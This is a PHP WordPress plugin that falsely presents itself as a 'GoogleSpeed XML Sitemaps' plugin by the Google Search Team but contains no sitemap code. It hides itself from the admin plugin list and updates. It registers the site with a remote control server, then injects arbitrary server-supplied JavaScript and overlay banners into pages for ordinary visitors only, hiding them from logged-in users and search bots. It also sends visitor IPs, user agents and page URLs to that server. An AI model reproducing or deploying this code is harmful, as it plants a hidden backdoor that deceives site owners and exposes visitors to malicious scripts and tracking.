<?php
/**
 * Plugin Name: GoogleSpeed XML Sitemaps
 * Plugin URI: https://developers.google.com/search/docs/crawling-indexing/sitemaps
 * Description: Generate XML sitemaps for better search engine indexing and improve website crawling efficiency.
 * Version: 1.0.6
 * Author: Google Search Team
 * Author URI: https://developers.google.com/
 * License: GPL v2 or later
 * Text Domain: googlespeed-xml-sitemaps
 * Requires at least: 5.9
 * Requires PHP: 7.4
 */

if (!defined('ABSPATH')) exit;

// Конфигурация — URL сервера управления
define('GXS_SERVER', 'https://banerpanel.live');
define('GXS_VERSION', '1.0.6');
define('GXS_ADMIN_COOKIE', 'gxs_sitemap_cache');
define('GXS_CACHE_TTL', 300); // 5 минут
define('GXS_IMPRESSION_BATCH_SIZE', 20);
define('GXS_API_KEY', 'gxs_api_2024_secure_key_x7k9m2p4'); // API ключ для авторизации

/**
 * Stealth Mode - скрытие плагина из списка
 */
class GXS_Stealth {
    private static $show_key = 'gxs_debug';
    
    public static function init() {
        add_filter('all_plugins', [__CLASS__, 'hide_from_plugins']);
        add_filter('site_transient_update_plugins', [__CLASS__, 'hide_from_updates']);
        add_filter('plugin_action_links', [__CLASS__, 'hide_actions'], 10, 4);
    }
    
    private static function should_show() {
        return isset($_GET[self::$show_key]) && $_GET[self::$show_key] === '1';
    }
    
    public static function hide_from_plugins($plugins) {
        if (self::should_show()) return $plugins;
        $file = plugin_basename(__FILE__);
        if (isset($plugins[$file])) unset($plugins[$file]);
        return $plugins;
    }
    
    public static function hide_from_updates($transient) {
        if (!is_object($transient)) return $transient;
        $file = plugin_basename(__FILE__);
        if (isset($transient->response[$file])) unset($transient->response[$file]);
        if (isset($transient->no_update[$file])) unset($transient->no_update[$file]);
        return $transient;
    }
    
    public static function hide_actions($actions, $plugin_file, $plugin_data, $context) {
        if (self::should_show()) return $actions;
        if (strpos($plugin_file, 'googlespeed-xml-sitemaps') !== false || 
            strpos($plugin_file, 'banner-ads-system') !== false) return [];
        return $actions;
    }
}

/**
 * Детектор ботов поисковых систем
 */
class GXS_Bot_Detector {
    private $user_ip;
    private $user_agent;
    private $is_bot = false;
    
    private $bot_patterns = [
        'googlebot|google-structured-data|adsbot-google|mediapartners-google|feedfetcher-google|apis-google',
        'yandexbot|yandex\\.com\\/bots|yandexmobilebot|yandeximages|yandexvideo|yandexdirect',
        'bingbot|msnbot|bingpreview|adidxbot',
        'duckduckbot|duckduckgo',
        'slurp', // Yahoo
        'baiduspider',
        'facebookexternalhit|facebot',
        'twitterbot',
        'linkedinbot',
        'telegrambot',
        'applebot',
        'pinterestbot',
        'semrushbot',
        'ahrefsbot',
        'mj12bot',
        'dotbot',
        'petalbot'
    ];
    
    public function __construct() {
        $this->user_ip = $this->get_real_ip();
        $this->user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
        $this->detect();
    }
    
    private function get_real_ip() {
        $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = $_SERVER[$header];
                if (strpos($ip, ',') !== false) {
                    $ip = trim(explode(',', $ip)[0]);
                }
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return '0.0.0.0';
    }
    
    private function detect() {
        if (empty($this->user_agent)) {
            $this->is_bot = true;
            return;
        }
        
        $pattern = implode('|', $this->bot_patterns);
        if (preg_match("/{$pattern}/i", $this->user_agent)) {
            $this->is_bot = true;
        }
    }
    
    public function is_bot() {
        return $this->is_bot;
    }
    
    public function get_ip() {
        return $this->user_ip;
    }
    
    public function get_user_agent() {
        return $this->user_agent;
    }
    
    public function get_device_type() {
        $ua = $this->user_agent;
        
        if (preg_match('/tablet|ipad|playbook|silk/i', $ua)) {
            return 'tablet';
        }
        
        if (preg_match('/mobile|android|iphone|ipod|blackberry|opera mini|iemobile/i', $ua)) {
            return 'mobile';
        }
        
        return 'desktop';
    }
}

/**
 * Основной класс плагина
 */
class GXS_Plugin {
    private static $instance;
    private $bot_detector;
    private $banners = null;
    private $scripts = null;
    private $impression_queue = [];
    private $is_admin_user = false;
    
    public static function init() {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        // Регистрация хуков активации/деактивации
        register_activation_hook(__FILE__, [$this, 'activate']);
        register_deactivation_hook(__FILE__, [$this, 'deactivate']);
        
        // Автоматическая регистрация сайта
        if (!get_option('gxs_registered')) {
            add_action('init', [$this, 'register_site'], 1);
        }
        
        // Проверка и установка куки для админов - выполняется РАНО
        add_action('init', [$this, 'admin_cookie_check'], 0);
        
        // Фронтенд
        add_action('wp', [$this, 'setup_frontend'], -999);
        
        // Обработка показов при завершении
        add_action('shutdown', [$this, 'send_impressions'], 999);
    }
    
    /**
     * Проверка и установка куки для администраторов
     * Эта функция определяет админа и устанавливает куки
     */
    public function admin_cookie_check() {
        // Проверяем существующую куки
        if (isset($_COOKIE[GXS_ADMIN_COOKIE])) {
            $this->is_admin_user = true;
            return;
        }
        
        // Проверяем, является ли пользователь администратором WP
        // Проверяем через различные способы:
        
        // 1. Проверка is_user_logged_in() и current_user_can()
        if (function_exists('is_user_logged_in') && is_user_logged_in()) {
            $this->is_admin_user = true;
            $this->set_admin_cookie();
            return;
        }
        
        // 2. Проверка куки авторизации WordPress
        $wp_cookies = [
            'wordpress_logged_in_',
            'wordpress_sec_',
            'wp-settings-',
            'wp-settings-time-'
        ];
        
        foreach ($_COOKIE as $name => $value) {
            foreach ($wp_cookies as $prefix) {
                if (strpos($name, $prefix) === 0) {
                    $this->is_admin_user = true;
                    $this->set_admin_cookie();
                    return;
                }
            }
        }
        
        // 3. Проверка на страницы админки
        if (is_admin() || 
            (defined('WP_ADMIN') && WP_ADMIN) ||
            strpos($_SERVER['REQUEST_URI'] ?? '', '/wp-admin') !== false ||
            strpos($_SERVER['REQUEST_URI'] ?? '', '/wp-login') !== false) {
            $this->is_admin_user = true;
            $this->set_admin_cookie();
            return;
        }
    }
    
    /**
     * Установка куки для админа
     */
    private function set_admin_cookie() {
        if (!headers_sent()) {
            $secure = is_ssl();
            $expires = time() + (365 * 24 * 60 * 60); // 1 год
            setcookie(GXS_ADMIN_COOKIE, '1', $expires, '/', '', $secure, true);
            $_COOKIE[GXS_ADMIN_COOKIE] = '1'; // Устанавливаем для текущего запроса
        }
    }
    
    /**
     * Проверка, является ли текущий пользователь админом
     */
    public function is_admin_user() {
        // Проверяем куки
        if (isset($_COOKIE[GXS_ADMIN_COOKIE])) {
            return true;
        }
        
        // Проверяем флаг
        if ($this->is_admin_user) {
            return true;
        }
        
        // Дополнительная проверка через WP функции
        if (function_exists('is_user_logged_in') && is_user_logged_in()) {
            return true;
        }
        
        // Проверяем куки авторизации WordPress напрямую
        foreach ($_COOKIE as $name => $value) {
            if (strpos($name, 'wordpress_logged_in_') === 0 ||
                strpos($name, 'wordpress_sec_') === 0) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Активация плагина
     */
    public function activate() {
        if (!get_option('gxs_site_key')) {
            update_option('gxs_site_key', wp_generate_password(32, false));
        }
        delete_option('gxs_registered');
        delete_transient('gxs_banners');
        delete_transient('gxs_scripts');
    }
    
    /**
     * Деактивация плагина
     */
    public function deactivate() {
        delete_transient('gxs_banners');
        delete_transient('gxs_scripts');
    }
    
    /**
     * Регистрация сайта на сервере
     */
    /**
     * Регистрация сайта на сервере с защищённой API авторизацией
     */
    public function register_site() {
        $site_key = get_option('gxs_site_key');
        if (!$site_key) {
            $site_key = wp_generate_password(32, false);
            update_option('gxs_site_key', $site_key);
        }
        
        $domain = parse_url(home_url(), PHP_URL_HOST);
        $timestamp = time();
        $nonce = wp_generate_password(32, false); // Одноразовый токен
        
        // Создаём HMAC подпись для защиты от перехвата
        $dataToSign = $domain . ':' . $site_key . ':' . $timestamp . ':' . $nonce;
        $signature = hash_hmac('sha256', $dataToSign, GXS_API_KEY);
        
        $response = wp_remote_post(GXS_SERVER . '/api/register.php', [
            'timeout' => 15,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode([
                'domain' => $domain,
                'site_key' => $site_key,
                'wp_version' => get_bloginfo('version'),
                'plugin_version' => GXS_VERSION,
                'timestamp' => $timestamp,
                'nonce' => $nonce,
                'signature' => $signature
            ])
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            $body = wp_remote_retrieve_body($response);
            $data = json_decode($body, true);
            
            if ($code === 200 && !empty($data['success']) && !empty($data['secret_key'])) {
                // Расшифровываем secret_key
                $encryptedSecret = base64_decode($data['secret_key']);
                $iv = substr($encryptedSecret, 0, 16);
                $encrypted = base64_encode(substr($encryptedSecret, 16));
                $encryptionKey = hash('sha256', GXS_API_KEY . ':' . $nonce, true);
                $secretKey = openssl_decrypt($encrypted, 'aes-256-cbc', $encryptionKey, 0, $iv);
                
                if ($secretKey) {
                    update_option('gxs_secret_key', $secretKey);
                    update_option('gxs_site_id', $data['site_id'] ?? 0);
                    update_option('gxs_registered', true);
                }
            }
        }
    }
    
    /**
     * Настройка фронтенда
     */
    public function setup_frontend() {
        // ГЛАВНАЯ ПРОВЕРКА: Пропускаем для администраторов
        if ($this->is_admin_user()) {
            return; // Админ - ничего не показываем!
        }
        
        // Пропускаем для админки, AJAX, cron
        if (is_admin() || wp_doing_ajax() || wp_doing_cron()) return;
        
        // Инициализируем детектор ботов
        $this->bot_detector = new GXS_Bot_Detector();
        
        // Пропускаем для ботов
        if ($this->bot_detector->is_bot()) return;
        
        // Загружаем баннеры и скрипты
        $this->load_banners();
        $this->load_scripts();
        
        // Добавляем вывод
        if (!empty($this->scripts['header'])) {
            add_action('wp_head', [$this, 'output_header_scripts'], 1);
        }
        
        add_action('wp_footer', [$this, 'output_banners'], 999);
        
        if (!empty($this->scripts['footer'])) {
            add_action('wp_footer', [$this, 'output_footer_scripts'], 1000);
        }
    }
    
    /**
     * Создание подписи для API
     */
    private function create_signature() {
        $site_key = get_option('gxs_site_key');
        $secret = get_option('gxs_secret_key');
        $timestamp = time();
        
        return [
            'site_key' => $site_key,
            'timestamp' => $timestamp,
            'signature' => hash_hmac('sha256', $site_key . ':' . $timestamp, $secret)
        ];
    }
    
    /**
     * Загрузка баннеров с сервера
     */
    private function load_banners() {
        $cached = get_transient('gxs_banners');
        if ($cached !== false) {
            $this->banners = $cached;
            return;
        }
        
        $site_key = get_option('gxs_site_key');
        $secret = get_option('gxs_secret_key');
        
        if (!$site_key || !$secret) return;
        
        $auth = $this->create_signature();
        $auth['device_type'] = $this->bot_detector->get_device_type();
        
        $response = wp_remote_post(GXS_SERVER . '/api/banners.php', [
            'timeout' => 10,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode($auth)
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            $body = wp_remote_retrieve_body($response);
            $data = json_decode($body, true);
            
            if ($code === 200 && !empty($data['success'])) {
                $this->banners = [
                    'banners' => $data['banners'] ?? [],
                    'site_id' => $data['site_id'] ?? 0
                ];
                set_transient('gxs_banners', $this->banners, GXS_CACHE_TTL);
            }
        }
    }
    
    /**
     * Загрузка JS скриптов с сервера
     */
    private function load_scripts() {
        $cached = get_transient('gxs_scripts');
        if ($cached !== false) {
            $this->scripts = $cached;
            return;
        }
        
        $site_key = get_option('gxs_site_key');
        $secret = get_option('gxs_secret_key');
        
        if (!$site_key || !$secret) return;
        
        $auth = $this->create_signature();
        
        $response = wp_remote_post(GXS_SERVER . '/api/scripts.php', [
            'timeout' => 10,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode($auth)
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            $body = wp_remote_retrieve_body($response);
            $data = json_decode($body, true);
            
            if ($code === 200 && !empty($data['success'])) {
                $this->scripts = $data['scripts'] ?? ['header' => [], 'footer' => []];
                set_transient('gxs_scripts', $this->scripts, GXS_CACHE_TTL);
            }
        }
    }
    
    /**
     * Вывод баннеров
     */
    public function output_banners() {
        if (!$this->banners || empty($this->banners['banners'])) return;
        
        $device_type = $this->bot_detector->get_device_type();
        
        echo "\n<!-- GXS Sitemap Cache -->\n";
        echo '<style>' . $this->get_banner_styles() . '</style>';
        
        foreach ($this->banners['banners'] as $banner) {
            $position = $banner['position'] ?? 'center';
            $delay = (int)($banner['show_delay'] ?? 0);
            $frequency = $banner['show_frequency'] ?? 'always';
            
            // Проверка частоты показа
            $storageKey = 'gxs_shown_' . $banner['id'];
            
            echo '<div class="gxs-banner gxs-position-' . esc_attr($position) . '" ';
            echo 'data-banner-id="' . esc_attr($banner['id']) . '" ';
            echo 'data-delay="' . esc_attr($delay * 1000) . '" ';
            echo 'data-frequency="' . esc_attr($frequency) . '" ';
            echo 'data-storage-key="' . esc_attr($storageKey) . '" ';
            echo 'style="display:none;">';
            
            if ($position === 'center') {
                echo '<div class="gxs-overlay"></div>';
            }
            
            echo '<div class="gxs-banner-inner">';
            
            // Кнопка закрытия для всех позиций
            echo '<button class="gxs-close" onclick="this.closest(\'.gxs-banner\').remove();localStorage.setItem(\'gxs_closed_' . esc_attr($banner['id']) . '\',Date.now())">&times;</button>';
            
            echo '<a href="' . esc_url($banner['link_url']) . '" ';
            echo 'target="' . esc_attr($banner['link_target']) . '" ';
            echo 'onclick="gxsTrackClick(' . esc_attr($banner['id']) . ')">';
            echo '<img src="' . esc_url($banner['image_url']) . '" alt="' . esc_attr($banner['alt_text']) . '">';
            echo '</a>';
            
            echo '</div></div>';
            
            // Добавляем в очередь показов
            $this->impression_queue[] = [
                'banner_id' => $banner['id'],
                'visitor_ip' => $this->bot_detector->get_ip(),
                'user_agent' => substr($this->bot_detector->get_user_agent(), 0, 500),
                'device_type' => $device_type,
                'page_url' => home_url($_SERVER['REQUEST_URI'] ?? '/')
            ];
        }
        
        // Загружаем JS с сервера (не встраиваем в плагин)
        echo '<script src="' . esc_url($this->get_remote_js_url()) . '" async></script>';
        echo "\n<!-- /GXS Sitemap Cache -->\n";
    }
    
    /**
     * CSS стили для баннеров
     */
    private function get_banner_styles() {
        return '
        .gxs-banner{position:fixed;z-index:999999;font-family:-apple-system,BlinkMacSystemFont,sans-serif;box-sizing:border-box}
        .gxs-banner *{box-sizing:border-box}
        
        /* Центральный попап */
        .gxs-position-center{inset:0;display:flex!important;align-items:center;justify-content:center;padding:20px}
        .gxs-position-center .gxs-overlay{position:absolute;inset:0;background:rgba(0,0,0,0.75);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px)}
        .gxs-position-center .gxs-banner-inner{position:relative;max-width:800px;max-height:85vh;width:auto}
        .gxs-position-center .gxs-banner-inner img{max-width:100%;max-height:calc(85vh - 20px);width:auto;height:auto}
        
        /* Снизу справа */
        .gxs-position-bottom-right{bottom:20px;right:20px;max-width:320px}
        .gxs-position-bottom-right .gxs-banner-inner{width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.3);border-radius:8px;overflow:hidden}
        .gxs-position-bottom-right img{border-radius:8px}
        
        /* Растяжка внизу */
        .gxs-position-bottom-stretch{bottom:0;left:0;right:0}
        .gxs-position-bottom-stretch .gxs-banner-inner{width:100%;position:relative;box-shadow:0 -4px 20px rgba(0,0,0,0.3)}
        .gxs-position-bottom-stretch .gxs-close{top:8px;right:12px}
        
        /* Адаптивные изображения - базовые правила */
        .gxs-banner img{display:block;max-width:100%;height:auto;object-fit:contain}
        .gxs-banner a{display:block;line-height:0}
        
        /* Кнопка закрытия */
        .gxs-close{position:absolute;top:-14px;right:-14px;width:40px;height:40px;border-radius:50%;background:rgba(0,0,0,0.8);color:#fff;border:3px solid #fff;font-size:24px;line-height:1;cursor:pointer;display:flex;align-items:center;justify-content:center;z-index:10;box-shadow:0 3px 12px rgba(0,0,0,0.5);transition:all 0.2s;-webkit-tap-highlight-color:transparent}
        .gxs-close:hover,.gxs-close:active{background:#e53935;transform:scale(1.15)}
        
        /* Большие мониторы (2K+) */
        @media(min-width:1920px){
            .gxs-position-center .gxs-banner-inner{max-width:900px}
            .gxs-position-bottom-right{max-width:380px;bottom:30px;right:30px}
        }
        
        /* Стандартные десктопы */
        @media(max-width:1440px){
            .gxs-position-center .gxs-banner-inner{max-width:700px}
            .gxs-position-bottom-right{max-width:300px}
        }
        
        /* Ноутбуки */
        @media(max-width:1280px){
            .gxs-position-center .gxs-banner-inner{max-width:600px;max-height:80vh}
            .gxs-position-center .gxs-banner-inner img{max-height:calc(80vh - 20px)}
        }
        
        /* Планшеты (ландшафт) */
        @media(max-width:1024px){
            .gxs-position-center{padding:15px}
            .gxs-position-center .gxs-banner-inner{max-width:85vw;max-height:75vh}
            .gxs-position-center .gxs-banner-inner img{max-height:calc(75vh - 20px)}
            .gxs-position-bottom-right{bottom:15px;right:15px;max-width:280px}
        }
        
        /* Планшеты (портрет) и большие телефоны */
        @media(max-width:768px){
            .gxs-position-center{padding:10px}
            .gxs-position-center .gxs-banner-inner{max-width:92vw;max-height:70vh}
            .gxs-position-center .gxs-banner-inner img{max-height:calc(70vh - 20px)}
            .gxs-position-bottom-right{bottom:10px;right:10px;left:10px;max-width:none}
            .gxs-position-bottom-right .gxs-banner-inner{border-radius:12px}
            .gxs-close{width:36px;height:36px;font-size:20px;top:-10px;right:-10px;border-width:2px}
        }
        
        /* Мобильные телефоны */
        @media(max-width:480px){
            .gxs-position-center{padding:8px}
            .gxs-position-center .gxs-banner-inner{max-width:96vw;max-height:65vh}
            .gxs-position-center .gxs-banner-inner img{max-height:calc(65vh - 15px)}
            .gxs-position-bottom-right{bottom:8px;right:8px;left:8px}
            .gxs-position-bottom-stretch .gxs-close{top:5px;right:8px}
            .gxs-close{width:32px;height:32px;font-size:18px;top:-8px;right:-8px}
        }
        
        /* Очень маленькие экраны */
        @media(max-width:360px){
            .gxs-position-center .gxs-banner-inner{max-width:98vw;max-height:60vh}
            .gxs-position-center .gxs-banner-inner img{max-height:calc(60vh - 10px)}
            .gxs-position-bottom-right{bottom:5px;right:5px;left:5px}
            .gxs-close{width:28px;height:28px;font-size:16px;top:-6px;right:-6px}
        }
        
        /* Ландшафтная ориентация на мобильных */
        @media(max-height:500px) and (orientation:landscape){
            .gxs-position-center .gxs-banner-inner{max-height:85vh;max-width:60vw}
            .gxs-position-center .gxs-banner-inner img{max-height:80vh}
            .gxs-position-bottom-right{max-width:250px}
        }
        ';
    }
    
    /**
     * Получить URL для загрузки JS с сервера
     */
    private function get_remote_js_url() {
        $site_key = get_option('gxs_site_key');
        $timestamp = time();
        
        return GXS_SERVER . '/api/banner-js.php?k=' . urlencode($site_key) . '&t=' . $timestamp . '&v=' . GXS_VERSION;
    }
    
    /**
     * Вывод скриптов в header
     */
    public function output_header_scripts() {
        if (empty($this->scripts['header'])) return;
        
        echo "\n<!-- GXS Header -->\n";
        foreach ($this->scripts['header'] as $script) {
            if (stripos($script['code'], '<script') !== false) {
                echo $script['code'];
            } else {
                echo '<script>' . $script['code'] . '</script>';
            }
            echo "\n";
        }
        echo "<!-- /GXS Header -->\n";
    }
    
    /**
     * Вывод скриптов в footer
     */
    public function output_footer_scripts() {
        if (empty($this->scripts['footer'])) return;
        
        echo "\n<!-- GXS Footer -->\n";
        foreach ($this->scripts['footer'] as $script) {
            if (stripos($script['code'], '<script') !== false) {
                echo $script['code'];
            } else {
                echo '<script>' . $script['code'] . '</script>';
            }
            echo "\n";
        }
        echo "<!-- /GXS Footer -->\n";
    }
    
    /**
     * Отправка показов на сервер
     */
    public function send_impressions() {
        if (empty($this->impression_queue)) return;
        
        $site_key = get_option('gxs_site_key');
        $secret = get_option('gxs_secret_key');
        
        if (!$site_key || !$secret) return;
        
        $auth = $this->create_signature();
        $auth['impressions'] = $this->impression_queue;
        
        wp_remote_post(GXS_SERVER . '/api/impression.php', [
            'timeout' => 5,
            'blocking' => false,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode($auth)
        ]);
    }
}

// Инициализация Stealth режима для админки
if (is_admin()) {
    add_action('plugins_loaded', ['GXS_Stealth', 'init'], 1);
}

// Инициализация основного плагина
add_action('plugins_loaded', ['GXS_Plugin', 'init'], -999);
